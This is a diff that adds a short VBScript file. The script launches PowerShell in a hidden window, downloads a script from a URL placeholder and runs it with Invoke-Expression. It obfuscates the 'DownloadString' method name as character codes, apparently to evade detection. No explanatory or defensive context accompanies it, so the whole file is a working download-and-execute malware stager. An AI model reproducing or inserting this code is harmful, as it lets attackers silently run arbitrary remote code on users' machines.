@@ -1,0 +1,4 @@
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+command = "powershell -noexit   -command Invoke-Expression(New-Object Net.WebClient).(-join [char[]](68,111,119,110,108,111,97,100,83,116,114,105,110,103)).Invoke(%url%)"
+objShell.Run command,0
